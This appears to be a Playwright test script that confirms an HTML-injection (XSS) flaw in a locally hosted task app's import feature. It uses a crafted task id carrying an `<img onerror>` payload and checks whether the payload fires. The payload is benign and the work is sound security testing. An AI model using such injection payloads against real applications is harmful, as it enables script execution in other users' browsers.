/**
 * Focused confirmation of the import-based HTML injection found by probe.mjs.
 * An import is untrusted input: the file can come from anyone.
 */
import { chromium } from "playwright-core";

const EXEC = "/home/Jerry/.cache/ms-playwright/chromium-1254/chrome-linux64/chrome";
const TARGET = process.argv[2] || "http://127.0.0.1:3601/";
const browser = await chromium.launch({ executablePath: EXEC, args: ["--no-sandbox", "--disable-dev-shm-usage"] });
const ctx = await browser.newContext();
const page = await ctx.newPage();
await page.addInitScript(() => { window.__xss = 0; window.alert = () => { window.__xss++; }; });
page.on("dialog", (d) => d.dismiss().catch(() => {}));
await page.goto(TARGET, { waitUntil: "load" });

const res = await page.evaluate(() => {
  localStorage.clear();
  window.__xss = 0;
  S = blankState();
  const before = JSON.stringify(S);
  const crafted = {
    format: "taskapp-export",
    version: 1,
    domains: [{ id: "business", name: "Business" }],
    tasks: [{
      id: `x"><img src=x onerror="window.__xss=77">`,
      title: "looks harmless", domain_id: "business", status: "todo", priority: "medium",
      recurrence: "none", recurrence_interval: 1, tags: [],
      created_at: "2026-01-01T00:00:00.000Z", updated_at: "2026-01-01T00:00:00.000Z",
    }],
  };
  let st, threw = null;
  try { st = importData(crafted); } catch (e) { threw = String(e.message); }
  const saved = threw ? null : save();
  ui.view = "board";
  render();
  return {
    importStats: st || null, threw, saved,
    rollbackHappened: threw ? false : null,
    domHasInjectedImg: document.querySelectorAll('#main img[src="x"]').length,
    innerHTMLExcerpt: document.querySelector("#main").innerHTML.slice(0, 220),
  };
});
await page.waitForTimeout(600);
const after = await page.evaluate(() => ({
  xssCounter: window.__xss,
  imgs: [...document.querySelectorAll('img[src="x"]')].length,
  note: "onerror fires only after the failed image request resolves",
}));
console.log(JSON.stringify({ ...res, ...after }, null, 2));
await browser.close();
